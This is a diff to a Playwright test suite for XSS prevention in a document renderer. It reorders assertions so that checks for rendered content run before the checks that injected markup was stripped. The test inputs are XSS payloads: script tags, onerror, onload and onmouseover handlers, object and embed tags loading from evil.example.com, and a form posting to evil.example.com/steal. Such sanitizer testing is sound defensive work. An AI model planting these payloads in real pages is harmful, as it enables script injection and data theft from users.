@@ -71,6 +71,9 @@ const percentageContent = (overrides: {
 
 const passthroughContent = (html: string) => `++++\n${html}\n++++`;
 
+// Every "this was stripped" assertion here is a count of zero, which an empty
+// .doc satisfies just as well as a sanitized one. Assert something the card
+// does render first, so the negative assertions run against loaded content.
 base.describe('XSS Prevention', () => {
   base.beforeAll(async ({ resetProject }) => {
     await resetProject();
@@ -91,8 +94,8 @@ base.describe('XSS Prevention', () => {
         request,
         scoreCardContent({ title: '<script>alert(1)</script>' }),
       );
-      await expect(page.locator('.doc script')).toHaveCount(0);
       await expect(page.locator('.doc .card')).toHaveCount(1);
+      await expect(page.locator('.doc script')).toHaveCount(0);
     });
 
     base('sanitizes img onerror in title', async ({ page, request }) => {
@@ -102,8 +105,8 @@ base.describe('XSS Prevention', () => {
         request,
         scoreCardContent({ title: '<img src=x onerror=alert(1)>' }),
       );
-      await expect(page.locator('.doc [onerror]')).toHaveCount(0);
       await expect(page.locator('.doc .card')).toHaveCount(1);
+      await expect(page.locator('.doc [onerror]')).toHaveCount(0);
     });
 
     base('sanitizes script tag in unit', async ({ page, request }) => {
@@ -113,9 +116,9 @@ base.describe('XSS Prevention', () => {
         request,
         scoreCardContent({ unit: '<script>alert(1)</script>' }),
       );
-      await expect(page.locator('.doc script')).toHaveCount(0);
       await expect(page.locator('.doc').getByText('Safe title')).toBeVisible();
       await expect(page.locator('.doc').getByText('Safe legend')).toBeVisible();
+      await expect(page.locator('.doc script')).toHaveCount(0);
     });
 
     base('sanitizes script tag in legend', async ({ page, request }) => {
@@ -125,8 +128,8 @@ base.describe('XSS Prevention', () => {
         request,
         scoreCardContent({ legend: '<script>alert(1)</script>' }),
       );
-      await expect(page.locator('.doc script')).toHaveCount(0);
       await expect(page.locator('.doc').getByText('Safe title')).toBeVisible();
+      await expect(page.locator('.doc script')).toHaveCount(0);
     });
   });
 
@@ -138,9 +141,9 @@ base.describe('XSS Prevention', () => {
         request,
         percentageContent({ title: '<script>alert(1)</script>' }),
       );
-      await expect(page.locator('.doc script')).toHaveCount(0);
       await expect(page.locator('.doc svg')).toHaveCount(1);
       await expect(page.locator('.doc').getByText('Safe legend')).toBeVisible();
+      await expect(page.locator('.doc script')).toHaveCount(0);
     });
 
     base('sanitizes script tag in legend', async ({ page, request }) => {
@@ -150,7 +153,6 @@ base.describe('XSS Prevention', () => {
         request,
         percentageContent({ legend: '<script>alert(1)</script>' }),
       );
-      await expect(page.locator('.doc script')).toHaveCount(0);
       await expect(page.locator('.doc svg')).toHaveCount(1);
       await expect(
         page
@@ -159,6 +161,7 @@ base.describe('XSS Prevention', () => {
           .filter({ visible: true })
           .first(),
       ).toBeVisible();
+      await expect(page.locator('.doc script')).toHaveCount(0);
     });
   });
 
@@ -172,8 +175,8 @@ base.describe('XSS Prevention', () => {
           request,
           passthroughContent('<script>alert("xss")</script><p>Safe</p>'),
         );
-        await expect(page.locator('.doc script')).toHaveCount(0);
         await expect(page.locator('.doc').getByText('Safe')).toBeVisible();
+        await expect(page.locator('.doc script')).toHaveCount(0);
       },
     );
 
@@ -186,8 +189,8 @@ base.describe('XSS Prevention', () => {
           request,
           passthroughContent('<div onmouseover="alert(1)">Hover</div>'),
         );
-        await expect(page.locator('.doc [onmouseover]')).toHaveCount(0);
         await expect(page.locator('.doc').getByText('Hover')).toBeVisible();
+        await expect(page.locator('.doc [onmouseover]')).toHaveCount(0);
       },
     );
 
@@ -200,6 +203,7 @@ base.describe('XSS Prevention', () => {
           request,
           passthroughContent('<svg onload="alert(1)"><circle r="40"/></svg>'),
         );
+        await expect(page.locator('.doc svg')).toHaveCount(1);
         await expect(page.locator('.doc [onload]')).toHaveCount(0);
       },
     );
@@ -233,8 +237,8 @@ base.describe('XSS Prevention', () => {
             '<object data="https://evil.example.com/mal.swf"></object><p>Safe</p>',
           ),
         );
-        await expect(page.locator('.doc object')).toHaveCount(0);
         await expect(page.locator('.doc').getByText('Safe')).toBeVisible();
+        await expect(page.locator('.doc object')).toHaveCount(0);
       },
     );
 
@@ -247,8 +251,8 @@ base.describe('XSS Prevention', () => {
           '<embed src="https://evil.example.com/mal.swf"><p>Safe</p>',
         ),
       );
-      await expect(page.locator('.doc embed')).toHaveCount(0);
       await expect(page.locator('.doc').getByText('Safe')).toBeVisible();
+      await expect(page.locator('.doc embed')).toHaveCount(0);
     });
 
     base(
@@ -262,8 +266,9 @@ base.describe('XSS Prevention', () => {
             '<form action="https://evil.example.com/steal"><input value="data"></form><p>Safe</p>',
           ),
         );
-        await expect(page.locator('.doc form')).toHaveCount(0);
         await expect(page.locator('.doc').getByText('Safe')).toBeVisible();
+        await expect(page.locator('.doc form')).toHaveCount(0);
+        await expect(page.locator('.doc input')).toHaveCount(0);
       },
     );
   });
